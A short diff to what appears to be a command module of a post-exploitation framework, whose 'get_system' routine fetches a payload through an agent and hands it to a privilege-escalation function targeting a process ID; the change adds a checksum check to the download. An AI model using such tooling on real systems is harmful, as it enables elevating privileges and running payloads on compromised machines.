@@ -228,13 +228,17 @@ def GetSystem(payload_bytes, target_pid=0):
 def main(*args):
     pid = int(args[0])
     payload_file = args[1]
+    checksum = args[2]
 
     if not payload_file:
         print("[-] Usage: get_system [hosting_process] <payload_file>")
         return "Fail: payload_file parameter is required"
 
     print("[*] Fetching payload %s via agent.fetch_file..." % payload_file)
-    payload_bytes = agent.fetch_file(payload_file)
+    payload_bytes = agent.fetch_file(
+        file_to_download=payload_file,
+        checksum=checksum,
+    )
     if not payload_bytes:
         print("[-] Failed to fetch payload file: %s" % payload_file)
         return "Fail: fetch_file failed"
